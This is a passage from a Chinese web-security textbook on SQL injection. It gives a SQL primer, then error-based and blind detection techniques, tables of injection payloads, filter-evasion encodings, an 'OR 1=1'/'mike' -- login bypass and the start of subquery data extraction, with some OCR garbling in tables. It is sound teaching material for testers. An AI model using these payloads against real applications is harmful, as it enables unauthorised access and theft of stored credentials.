break-word;'>长脚本中必须使用的字符</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.</td><td style='text-align: center; word-wrap: break-word;'>%2e</td><td style='text-align: center; word-wrap: break-word;'>用于目录遍历攻击，文件访问</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/</td><td style='text-align: center; word-wrap: break-word;'>%2f</td><td style='text-align: center; word-wrap: break-word;'>用于目录遍历攻击</td></tr></table>

### 6.6 参考和进一步阅读

#### 相关厂商通报和补丁

Internet Information Server 在 HTTP 头

（Content-Location）中返回 IP 地址

HTTP 响应头截断

RSnake 的文章: XSS 欺骗备忘录 (XSS Cheat Sheet)

#### 链 接

Gunter Ollmann 的文章：URL 编码攻击（URL Encoded Attacks）

http://support.microsoft.com/directory/article.asp?ID=KB;EN-US;Q218180

http://www.watchfire.com/securityzone/library/whitepapers.aspx

Google.com 的（UTF-7）XSS 漏洞

http://ha.ckers.org/xss.html

http://www.technicalinfo.net/papers/URLEmbeddedAttacks.html

#### 免费工具

http://www.watchfire.com/securityzone/

advisories/12-21-05.aspx

Netcat 的 Windows 版本

Cygwin

http://www.cygwin.com/

lynx

http://lynx.browser.org/

wget

http://www.gnu.org/directory/wget.html

#### 通用参考书目

RFC 2396: “统一资源标识符: 基本语法”

HTML 4.01 表单规范说明书

PHP 脚本语言

ASP.NET 脚本语言

CERT 报告

跨站脚本概述（法语）

Hotmail XSS 漏洞

http://www.ietf.org/rfc/rfc2396.txt

http://www.w3.org/TR/html401/interact/

forms.html

http://www.php.net/

http://www.asp.net/

http://balteam.multimania.com/Tuts/css.txt

http://www.cert.org/advisories/CA-2000-02.html

http://www.usatoday.com/life/cyber/

tech/2001-08-31-hotmail-security-side.htm

## 第 7 章 攻击 Web 数据存储

最实用的应用程序应该能为用户清晰地展示、灵活地处理以及迅速地获取信息。这些信息可以是各种各样的数据形式——从 Web 杂志条目到小程序分类到实时金融信息。用户通常只能看到眼前五彩缤纷的前端购物界面，却看不到在屏幕的后面运行着的若干台并不十分炫的数据库服务器，诸如著名 OZ 的数据库服务器，它们默默地管理着库存、用户登录、E-mail 和其他与数据相关的功能。虽然 OZ 把设计和展现合在一起，但应用程序的数据库必须是可靠和高效的。

但是，这看不见的服务器并非是无法触及的。在本章中，我们会演示如何修改变量（比如你的用户名），使之包含特殊的指令，从而影响数据库的执行。如果在 SQL 注入技术中利用这些漏洞，会影响到应用的核心。

针对 SQL 注入漏洞的攻击是各种各样的，它们能导致程序产生无伤大雅的小错误，也能导致完全命令行执行（full command-line execution）。对于这类攻击，还没有哪个特别的数据库具有更好的防御能力。漏洞是在 SQL 查询和它们支持的编程接口中引入的，无论这些编程接口是用 ASP、PHP、Perl 还是其他 Web 语言编写，都是不能幸免的。这些漏洞是由于缺乏安全编程和数据库安全配置而导致的，并不是缺少数据库本身的安全补丁。

### 7.1 SQL 入门

还记得在第 1 章中描述的 Web 应用程序结构吗？现在我们关心的是数据存储。因此，让我们研究一下 Web 服务器是如何与数据库交互的。Web 服务器只能理解 HTTP 协议，而数据库服务器只能理解一种特殊的语言：SQL。很多例子都可以说明为什么 Web 服务器需要连接到数据库，但我们以常见的用户登录页面为例。

当一个用户登录到站点时，Web 应用收集两方面的信息：用户名和密码。应用程序使用这两个参数创建一个 SQL 语句，用来从数据库中收集一些信息。但是，在这里只有 Web

服务器（比如 login.php 页面）能够执行所有的动作；然后，Web 服务器连接数据库。该连接可能创建一次并在连接池中维持很长一段时间，或者在当两个服务器需要通信时才建立。不管怎样，Web 服务器用自己的用户名和密码向数据库认证。

现在 Web 服务器和数据库交互了。因此，login.php 将用户证书（用户名和密码）作为一个 SQL 语句传递给数据库。数据库接受该语句，执行它，然后反馈诸如“用户名和密码匹配”或“没有找到用户名”这样的响应信息。应用程序 login.php 处理从数据库返回的响应。

SQL 为应用程序提供强大的功能。除了使用数据库外，几乎没有任何方法可以保存、查询和管理如此大量的数据。因此，理解 SQL 语句是如何被误用的就显得特别重要。

提示 SQL 查询（SQL query）和 SQL 语句（SQL statement）在本章同时使用。通常，查询（query）是指使用一个 SELECT 语句；而语句（statement）是使用 INSERT，UPDATE 或其他类似 SELECT 的命令。

#### 7.1.1 语法

结构化查询语言（Structured Query Language，SQL）诞生于IBM研究院，他们当时希望建立一个操纵关系数据库中信息的标准。即使用单独的一章讲述，也不可能涵盖该语言所有的规则、特征和作用。本节仅向你介绍其基本语法和命令的使用。

SQL 提供了一组丰富的指令和功能，可以联合起来创建语句，以此访问和操纵数据。简单的查询和英语有很多类同之处。最基础的查询，是基于限制性的标准，从一个表中选择出一条记录（record，即“row”）。比如，下面是一个简单的查询，在 UserTable 的所有记录中，寻找 FirstName 是“Mike”的所有记录。

SELECT * FROM UserTable WHERE FirstName='Mike';

如果在表中叫 Mike 的人不止一个，那么查询会返回多条记录。在很多情况下，开发者可能希望进一步限制查询使得返回更少量的记录。举个例子，下面这条查询在 UserTable 的所有记录中，寻找 FirstName 是 “Mike”， LastName 是以大写 S 开始的所有记录。

SELECT * FROM UserTable WHERE FirstName='Mike' AND LastName LIKE 'S%';

到这里，暂停一下研究一些 SQL 语句的语法规则是很重要的。毕竟，最常见的 SQL 注入攻击就是尝试破坏一个 SQL 语句的语法。

☐ 查询由一个分号结束；

☐ 字符串值由单引号表示，比如，'foobar';

括号可以用在一组逻辑标准中，比如，SELECT * FROM table WHERE a=b AND (c=d OR e=f)。

#### 7.1.2 SELECT, INSERT 和 UPDATE

每个数据库都提供了一打函数和数据操作语句。我们将介绍最常见的三种。关于这些语句的使用方法，特别是在复杂查询中如何使用它们的知识，会有助你理解 SQL 注入漏洞是如何发现的，以及更重要的是，帮助你理解 SQL 注入漏洞是如何被利用的。表 7-1 列出了这些语句的基本语法。limiting_criteria 和 val 参数是应用程序基于收到的用户数据而构成的。这些参数是 SQL 注入攻击中最常见的目标。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>语 句</td><td style='text-align: center; word-wrap: break-word;'>描 述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SELECT</td><td style='text-align: center; word-wrap: break-word;'>从一个表中获得一条或多条记录SELECT expression FROM table WHERE limiting_criteria</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>INSERT</td><td style='text-align: center; word-wrap: break-word;'>往表中添加一条新记录INSERT INTO table (coll, col2, col3, ...) VALUES (val1, val2, val3, ...)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UPDATE</td><td style='text-align: center; word-wrap: break-word;'>修改表中的一条记录。UPDATE table SET column = expression WHERE limiting_criteria</td></tr></table>

本节的目的是对 SQL 提供一个简要的介绍。更多功能和高级查询结构在本章余下的内容中讲述。如果你希望了解更多关于 SQL 的信息，请查看 MySQL 文档中的例子，比如站点 http://sqlcourse.com，或者参考 SQL InANutshell（O'Reilly）一书。

### 7.2 发现 SQL 注入

SQL 注入漏洞可以由影响数据库查询的任何应用程序参数产生,包括 URL 参数,POST 数据 Cookie 值。因此,测试应用程序的所有参数以确定是否有漏洞是很必要的。确定 SQL 注入漏洞的最简单方法是在参数值后面添加一些非法或不期望的字符,然后观察应用程序是否会响应错误信息。当应用程序不阻止来自数据库的任何错误消息时,这种基于语法的方法是最有效的。当执行了错误处理（或者显示一些简单的输入验证）,那么可以通过语义分析技术测试应用对合法 SQL 结构行为而识别漏洞。

### 7.2.1 语法和错误

语法测试是注入一些字符串到参数中，故意破坏数据库查询的语法。其目的是寻找可能在数据库中产生错误的字符，这些错误传回应用程序，最后返回到服务器的响应中。我们从最常见的注入字符开始：单引号（'）。记住单引号在一个 SQL 语句中是用来分割字符

串值的。因此，我们第一个 SQL 注入测试如下所示：

http://Website/aspnuke/module/support/task/detail.asp?taskid=1'

服务器的响应如浏览器中所示，显示一个数据库错误和应用程序试图提交给数据库的非法查询。注意图 7-1 中靠近出错消息结尾位置的 WHERE tsk.TaskId=1'字符串，看看注入的字符是在哪里结束的。

http://10.0.1.4/aspnuke/module/support/task/detail.asp?taskid=1
C
+
/aspnuke/module/support/task/detail.asp?taskid=1
Q Google
Error # -2147217887 (0x80040E21)
ODBC driver does not support the requested properties.
SELECT task.TaskID, tsk.Title, tsk.Comments, usr.FirstName, usr.LastName,
pri.PriorityName, sta.StatusName, 0 As CommentCount, tsk.Created FROM tblTask tsk
INNER JOIN tblUser usr ON tsk.UserID = usr.UserID INNER JOIN tblTaskPriority pri
ON pri.PriorityID = tsk.PriorityID INNER JOIN tblTaskStatus sta ON sta.StatusID =
tsk.StatusID WHERE tsk.TaskID = 1' AND tsk.Active < 0 AND tsk.Archive = 0

 </div>

现在让我们看看这条测试语句如何起作用以及为什么会起作用：字符串串接。Web应用程序中的很多查询都含有这样的子句，某些用户输入可以篡改它们使其偏离原意。在前面这个例子中，detail.asp 使用 taskid 参数的值作为查询的一部分。下面是一部分源代码。注意观察带下划线的 taskid 参数的使用（为了便于阅读，删除了一些代码行）。

sStat = "SELECT tsk.TaskID, tsk.Title, tsk.Comments" &_
...
"FROM tblTask tsk " &_
...
"WHERE tsk.TaskID = " & steForm("taskid") & " " &_
"AND tsk.Active <> 0 " &_
"AND tsk.Archive = 0"
Set rsArt = adoOpenRecordset(sStat)

使用字符串串接创建查询是导致 SQL 注入的根本原因。当参数的值逐字地放到字符串中时，攻击者可以轻易地改写查询。因此，攻击者并非使用数字参数创建一个如下的合法查询：

SELECT tsk.TaskID, tsk.Title, tsk.Comments FROM tblTask tsk WHERE tsk.TaskID = 1 AND tsk.Active <> 0 AND tsk.Archive = 0

而是通过引入一个不匹配的单引号字符，破坏其语法：

SELECT tsk.TaskID, tsk.Title, tsk.Comments FROM tblTask tsk WHERE tsk.TaskID = 1' AND tsk.Active <> 0 AND tsk.Archive = 0

不正确的语法造成了一个错误，该错误常常会传回到用户的 Web 浏览器中。一个常见的错误消息如下：

[Microsoft] [ODBC SQL Server Driver] [SQL Server] Incorrect syntax...

我们将会看到更多的错误消息。现在我们只关注什么样的内容可以确认 SQL 注入漏洞。插入一个单引号并产生一个错误，并不会暴露密码或者使得攻击者绕过访问限制，但这常常是必备的环节。在下一节中，我们将探索改写查询的更先进的方法。现在，让我们来研究在应用程序拥有简单的输入过滤，能够丢弃单引号字符的情况下，识别漏洞的其他方法。

单引号字符并不是能够破坏查询语法的唯一字符。表 7-2 列出了其他的一些有助于识别 SQL 注入漏洞的字符。

当然，该技术建立在如下事实的基础之上，即应用程序会返回一些消息指明发生了一个数据库错误，否则，不可能确切地分辨出是否存在一个漏洞。表 7-3 列出了一些数据库产生的常见错误字符串。该列表并不完备，但它让你了解错误看起来是什么样子的。在很多情况下，真正的 SQL 语句总是与错误消息结伴而行。同样，请注意这些错误的范围是跨越了数据库平台和开发语言的。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>字符</td><td style='text-align: center; word-wrap: break-word;'>和 SQL 关系</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>•</td><td style='text-align: center; word-wrap: break-word;'>单引号。用来分割字符串值。一个不匹配的引号会产生错误</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>•</td><td style='text-align: center; word-wrap: break-word;'>结束一个语句。提前结束查询会产生一个错误</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/*</td><td style='text-align: center; word-wrap: break-word;'>注释分割符。注释分割符内的文字会被忽略</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>--%20</td><td style='text-align: center; word-wrap: break-word;'>可以用来提前终止一个查询</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>( )</td><td style='text-align: center; word-wrap: break-word;'>圆括号。用来组合逻辑子句。不匹配的括号会产生一个错误</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>a</td><td style='text-align: center; word-wrap: break-word;'>如果用在数字比较中，任何字母字符都可以产生一个错误。举个例子，WHERE TaskID = 1 是合法的，因为 TaskID 列是数字而 1 是数字。从另一方面来说，WHERE TaskID = 1a 是非法的，因为 1a 不是一个数字。</td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>平台</td><td style='text-align: center; word-wrap: break-word;'>错误字符串示例</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ODBC, ASP</td><td style='text-align: center; word-wrap: break-word;'>Microsoft OLE DB Provider for odbc Drivers error &#x27;80040e21&#x27;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ODBC, C#</td><td style='text-align: center; word-wrap: break-word;'>[Microsoft][ODBC SQL Server Driver][SQL Server] Unclosed quotation mark</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>平台</td><td style='text-align: center; word-wrap: break-word;'>错误字符串示例</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.NET</td><td style='text-align: center; word-wrap: break-word;'>Stack Trace: [SqlException (0x80131904): Oracle, JDBC SQLException: ORA-01722: invalid number ColdFusion Invalid data for CFSQLTYPE MySQL, PHP Warning: mysql_erno(): supplied argument is not a valid MySQL PostgreSQL, Perl Warning: PostgreSQL query failed:</td></tr></table>

最后，一些错误发生在应用程序层，即错误发生在一条语句构造前或者查询发送到数据库前。表 7-4 列出了一些错误消息。辨别错误是在哪里发生的很重要。一个产生解析错误的攻击（比如试图将一个字符串转换为一个整数）与一个可以改写数据库查询的攻击，对应用程序的威胁是差别很大。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>Implicit conversion from datatype &#x27;VARCHAR&#x27; to &#x27;INT&#x27; is not allowed. Use the CONVERT function to run this query.</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ERROR: column &quot;foo&quot; cannot be cast to type &quot;int4&quot;</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Overflow: &#x27;cInt&#x27; error.</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Syntax error converting the varchar value &#x27;a b&#x27; to a column of data type int.</td></tr></table>

本章中，大部分时候我们将 URL 参数或 POST 数据作为 SQL 注入攻击的入口。实际上，任何用户可以修改的动态数据，都意味着一个潜在的攻击点。记住，应该像测试其他参数一样测试 Cookie 值。图 7-2 显示了当追加一个单引号到老版本 phpBB 的 Cookie 值末尾时，发生的一个错误。

 </div>

 </div>

#### 7.2.2 语义和行为

即使一个单引号不会产生错误信息，应用程序也并非不会受到 SQL 注入的攻击。系统管理员可能对服务器进行了设置，使其遇到错误时，以一个默认的错误页面作为响应，乃至以主页作为响应。开发者可能知道应该从接收到的用户参数中去掉引号。但是去掉错误信息只是意味着应用程序能避免某种 SQL 注入攻击。下面，我们将概括一些针对这种攻击技术的防御规则。

不要依赖于错误字符串来确定是否存在漏洞。

☐ 不要依赖于单引号来确定是否存在漏洞。

- 将内容中需要的可疑字符减到最少。你会看到，在这些测试中逗号和括号通常很有用。

与注入字符破坏查询这种攻击思路相比较，基于语义的攻击是截然相反的攻击方法。基于语义的攻击，或者“盲”SQL注入，不依赖于非法查询产生的错误信息。基于语义的攻击尝试以含义相同但内容不同的方式改写查询。在我们钻研这是如何通过SQL来实现之前，回想一下基础代数的结合率和交换率。

 $$ \mathrm{x}+(\mathrm{y}+\mathrm{z})=(\mathrm{x}+\mathrm{y})+\mathrm{z} $$ 

 $$ \mathrm{x}+\mathrm{y}=\mathrm{y}+\mathrm{x} $$ 

我们把该特性应用到 SQL 注入概念上，创建 “语义” ——查询，该查询用不同的结构，产生同样结果。当然，SQL 支持很多数学函数，所以我们从这些函数开始。想象一个在线仓库，有上千种产品可以选择，一种改善用户浏览体验的方法是分类组织这些产品，并使用一个 URL 参数追踪当前的分类：

http://Website/browse.cgi?catalog=17

现在，让我们看看一些用来确定是否存在 SQL 注入漏洞的查询：

http://Website/browse.cgi?catalog=10%2b7 (10+7)

http://Website/browse.cgi?catalog=MOD(17,18)

http://Website/browse.cgi?catalog=0x11

提示 记住，在 URL 参数中加号（+）代表一个空格（ASCII 0x20）。将它编码成%2b，保证应用程序可以收到正确的符号。

因为该技术不依赖于错误消息，所以不存在 Web 服务器响应中需要查找的特定模式或字符串。相反，你要看带不同参数值的两个请求是否返回相同的信息。举个例子，即便 id 参数是不同的值，图 7-3 和图 7-4 有同样的响应。

 </div>

 </div>

比如，考虑一个包含 MOD（17,18）分类值的 URL。其原始的字符串 MOD（17,18）是故意逐字传递给数据库的。虽然它使用一个函数来确定分类值，但它符合合法的语法，所以数据库还是会处理该查询。比如，

 $$ \mathrm{S E L E C T~N a m e,P r i c e~F R O M~P r o d u c t T a b l e~W H E R E~C a t a l o g=M O D(17,18)} $$ 

和下面这句查询是等效的：

 $$ \mathrm{S E L E C T~N a m e,P r i c e~F R O M~P r o d u c t T a b l e~W H E R E~C a t a l o g=17} $$ 

加法可能是对数字参数进行测试的最简单的方法。表 7-5 描述了其他一些使用 SQL 求解参数值的方法。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>载荷</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>n+m</td><td style='text-align: center; word-wrap: break-word;'>加</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MOD(n, n+1)</td><td style='text-align: center; word-wrap: break-word;'>求模计算</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>载荷</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0xhh</td><td style='text-align: center; word-wrap: break-word;'>十六进制表示</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0nnn</td><td style='text-align: center; word-wrap: break-word;'>八进制表示</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>COALESCE(NULL,n)</td><td style='text-align: center; word-wrap: break-word;'>返回列表中第一个非 NULL 值</td></tr></table>

基于字符串的测试是对这种 SQL 注入技术的挑战, 因为它们通常会带上单引号。因此, 值'foo'和'0x666f6f'是不同的, 后面这个值被解释为一个字符串, 而不是字符串的十六进制等价形式。请看表 7-6。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>载荷</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0x666f6f</td><td style='text-align: center; word-wrap: break-word;'>ASCII字符串的十六进制表示，0x666f6f = foo</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CONCAT(0x666f6f)</td><td style='text-align: center; word-wrap: break-word;'>CONCAT()函数，连接一字符串列表</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LEAST(0x670000,0x666f6f)</td><td style='text-align: center; word-wrap: break-word;'>返回列表中最小/最大的值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>GREATEST(0x61,0x666f6f)</td><td style='text-align: center; word-wrap: break-word;'>MySQL, Oracle</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>REVERSE(0x6f6f66)</td><td style='text-align: center; word-wrap: break-word;'>反转一个字符串</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>REVERSE(REVERSE(0x666f6f))</td><td style='text-align: center; word-wrap: break-word;'>MySQL, SQL Server</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>COALESCE(NULL,0x666f6f)</td><td style='text-align: center; word-wrap: break-word;'>返回列表中第一个非NULL值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CHAR(0x66,0x6f,0x6f)</td><td style='text-align: center; word-wrap: break-word;'>通过 CHAR 创建字符（MySQL）</td></tr></table>

如果应用程序没有过滤单引号，那么你可以执行一些不同类型的字母测试。这些测试列在表 7-7 中。当查询中的参数被单引号包起来时，比如，SELECT * FROM table WHERE a='foo'，这些测试是必要的。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>载荷</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>foo(%3b&#x27;bar&#x27;</td><td style='text-align: center; word-wrap: break-word;'>Microsoft SQL Server 中的字符串串连。将一个字符串分为多个部分，然后使用+操作符来恢复字符串。比如，foo+bar = foobar</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>foo&#x27;ll&#x27;bar&#x27;</td><td style='text-align: center; word-wrap: break-word;'>Oracle 的字符串串连</td></tr></table>

在本节的开始，我们提到了不生成错误及不依赖错误字符串来识别漏洞的办法。当然，如果我们可以生成错误，就可以获得一些有用的信息，包括数据库类型，甚至获取最初的SQL查询列表。表7-8列出了一些会产生数据库错误的有用载荷。这些载荷针对可能为数字的参数实施攻击，更容易成功。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>载荷</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>1e309</td><td style='text-align: center; word-wrap: break-word;'>算术溢出</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MOD(0,a)</td><td style='text-align: center; word-wrap: break-word;'>MOD()函数的非数字参数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>COS(a)</td><td style='text-align: center; word-wrap: break-word;'>COS()函数的非数字参数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>1/0</td><td style='text-align: center; word-wrap: break-word;'>除数为 0 的错误</td></tr></table>

基于行为的测试，或者“盲”SQL注入，可以识别语法测试不能发现的漏洞。盲SQL注入不依赖于诸如单引号之类的“恶意”字符，也不需要一个错误消息来确认是否成功。

提示 对于针对数字参数的攻击技术，击败它们最简单的一种方法是明确的把数字参数的值赋成一个数字数据类型（比如，一个整数）。值“1”可以被认为是一个字符串或一个整数，但值MOD(1,2)明确是一个字符串了。

#### 7.2.3 替换字符编码

可以改变 SQL 注入的载荷，来绕过输入验证过滤。当应用程序明确过滤了 SQL 查询所需要的一特定字符时，替换字符编码也是很有用的。表 7-9 和表 7-10 列出了很多数据库会认为是空格定界符的替换字符。你也可以尝试使用注释符，比如：

 $$ \mathrm{S E L E C T}/**/\mathrm{c o l u m n}/**/\mathrm{F R O M}/**/\mathrm{t a b l e}/**/\mathrm{W H E R E}/**/\mathrm{c l a u s e} $$ 

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>URL 编码值</td><td style='text-align: center; word-wrap: break-word;'>URL 编码值</td><td style='text-align: center; word-wrap: break-word;'>URL 编码值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%01</td><td style='text-align: center; word-wrap: break-word;'>%12</td><td style='text-align: center; word-wrap: break-word;'>%1a</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%09</td><td style='text-align: center; word-wrap: break-word;'>%13</td><td style='text-align: center; word-wrap: break-word;'>%1b</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%0a</td><td style='text-align: center; word-wrap: break-word;'>%14</td><td style='text-align: center; word-wrap: break-word;'>%1c</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%0b</td><td style='text-align: center; word-wrap: break-word;'>%15</td><td style='text-align: center; word-wrap: break-word;'>%1d</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%0c</td><td style='text-align: center; word-wrap: break-word;'>%16</td><td style='text-align: center; word-wrap: break-word;'>%1e</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%0d</td><td style='text-align: center; word-wrap: break-word;'>%17</td><td style='text-align: center; word-wrap: break-word;'>%1f</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%10</td><td style='text-align: center; word-wrap: break-word;'>%18</td><td style='text-align: center; word-wrap: break-word;'>%20</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%11</td><td style='text-align: center; word-wrap: break-word;'>%19</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>URL Unicode 值</td><td style='text-align: center; word-wrap: break-word;'>URL Unicode 值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%u2000</td><td style='text-align: center; word-wrap: break-word;'>%u2004</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%u2001</td><td style='text-align: center; word-wrap: break-word;'>%u2005</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%u2002</td><td style='text-align: center; word-wrap: break-word;'>%u2006</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%u2003</td><td style='text-align: center; word-wrap: break-word;'>%u3000</td></tr></table>

当然，其他诸如 Unicode 和 URL 之类的编码也有可能绕过过滤器——虽然它们可能被任何编写完善的过滤器所阻止。你可以在 Microsoft SQL Server 上使用 SPACE（）函数，SQL Server 把它作为一个定界符，如下所示：

SELECT (SPACE(1)) column (SPACE(1)) FROM (SPACE(1)) table (SPACE(1)) WHERE (SPACE(1)) clause

### 7.3 利用 SQL 注入漏洞

既然我们已经知道如何寻找 SQL 注入漏洞，那么接下来就可以确定漏洞对应用程序安全带来的影响了。通过插入一个单引号到 Cookie 值或提交一个带有 MOD（）函数的 POST 参数来产生一个错误是一回事；而从数据库获得任意信息则是另一回事了。本节介绍一些可用来攻击漏洞的方法。

就像你在前面已经看到的那样，SQL 提供了丰富的函数组，可以构造相当复杂的查询。另外，数据库平台扩展了 SQL 标准，带有可以操纵文件、数据以及与操作系统交互的函数。我们将从适合于所有数据库的技术开始，然后研究如何利用主流数据库平台的一些 SQL 扩展。

在本节中，我们深入讨论一些特定的技术。在一些情况下，我们或许会避而不谈 SQL 细节，或者直接使用特定的 SQL 命令或者构造而不解释为什么这是必要的。SQL 构造都是不难理解的。如果你不熟悉 SQL，那么我们推荐你阅读在本章开始 “SQL 入门” 一节中提到的其他资源。

#### 7.3.1 改变流程

数据库是用来存储信息的，因此不必惊讶，把数据作为攻击目标可能是黑客们脑子里首先闪现的念头。但是，如果我们可以使用 SQL 注入来改变查询的逻辑，那么可能可以改变应用程序中的流程。登录提示就是一个很好的例子。一个数据库驱动的应用程序，可能使用像下面这个例子的查询来验证用户的用户名和密码

 $$ \text{SELECT COUNT(ID) FROM UserTable WHERE UserId=‘‘ AND Password=‘‘} $$ 

如果用户提供的 UserId 和 Password 参数能与 UserTable 中的一条记录匹配，那么 COUNT(ID) 会等于一。在这种情况下，应用程序就会允许用户通过登录页面。如果 COUNT(ID) 为 NULL 或零，那么这意味着 UserId 或 Password 是不正确的，就不允许用户访问应用程序。

现在，假设对用户名参数没有进行输入验证，那么我们就可以改写查询，确保 SELECT

语句返回值总为真——而且只需用户名就可以实现。下面是修改后的查询：

SELECT COUNT(ID) FROM UserTable WHERE UserId='mike' -- ' AND Password='

注意，用户名包含了一个单引号和一个注释符。单引号正确地给出了 UserId（mike），而双虚线跟随一个空格代表一个注释，意味着右边的所有东西都被忽略。那么输入登录表单的用户名如下：

 $$ \mathrm{m i k e^{\prime}--\%20} $$ 

在这种情况下，我们已经使用 SQL 注入改变了应用程序的流程，而不是尝试获得一些任意的数据。这种方法针对登录页面、查看用户账户信息或者绕过访问控制都可以使用。表 7-11 列出了一些其他的 SQL 构造，你可以把它们作为参数值的一部分进行尝试。这些都是原始载荷，记得对空格和其他字符进行编码，这样它们的含义就不会在 HTTP 请求中被改变。例如，把空格编码成 %20 或加号(+)。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>载荷</td><td style='text-align: center; word-wrap: break-word;'>描述</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/*</td><td style='text-align: center; word-wrap: break-word;'>将查询的剩余部分作为注释</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/*</td><td rowspan="3">将查询的剩余部分作为注释（替换符号）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>--</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>--</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>OR 1=1</td><td style='text-align: center; word-wrap: break-word;'>试图强制生成 true 条件</td></tr></table>

#### 7.3.2 查询替换数据

因为数据库包含了应用程序的核心信息，所以它们代表了一种明确的目标。想获得用户名和密码的攻击者可能会尝试钓鱼和社会工程攻击一些应用程序的用户。另一方面，攻击者也可以尝试从数据库中盗取所有人的证书。

#### 子查询（Subquery）

子查询可以获得各种信息，从布尔指示（一条记录是否存在或者与某个值是否相等）到任意数据（一条完整的记录）。在前一节中已经说过，子查询也是一种很好的基于语义识别漏洞的技术（“盲”SQL注入）。一个精心设计的子查询可以使得攻击者知道一个请求是否成功。

最简单的子查询使用逻辑与操作符（AND），强制一个查询为假或保持它为真：

 $$ \begin{aligned}AND\quad1=1\end{aligned} $$ 

 $$ \begin{array}{r l}{\mathrm{A N D}}&{{}1=0}\end{array} $$ 

现在重要的是，子查询注入的查询语法没有被破坏。将子查询注入到一个简单的查询中很简单，就像下面这样：

SELECT price FROM Products WHERE ProductId=5436 AND 1=1

更复杂的查询有若干层括号，并带有 JOIN 子句，这样的查询不容易用基础的方法注入。因此，我们改变思路，把重点放在创建一个可以得到一些信息的子查询上。比如，下面对上例的查询的简单改写：

SELECT price FROM Products WHERE ProductId=(SELECT 5436)

通过使用（SELECT fo）子查询技术并将其扩展到更多有用的测试中，我们可以避免大多数语法破坏的问题，我们并不是总可以访问初始查询的语法，但是子查询的语法，诸如SELECT foo，是我们创建的。在这种情况下，我们不必担心闭合括号或其他字符的匹配问题。当子查询作为一个值使用时，它的内容会在剩下的查询前被处理。在下面这个例子中，我们尝试计算在默认 mysql.user 表中名为“root”的用户数量。如果只有一项，那么我们会看到当使用值 5436（5435+1 = 5436）时，响应的结果是一样的。

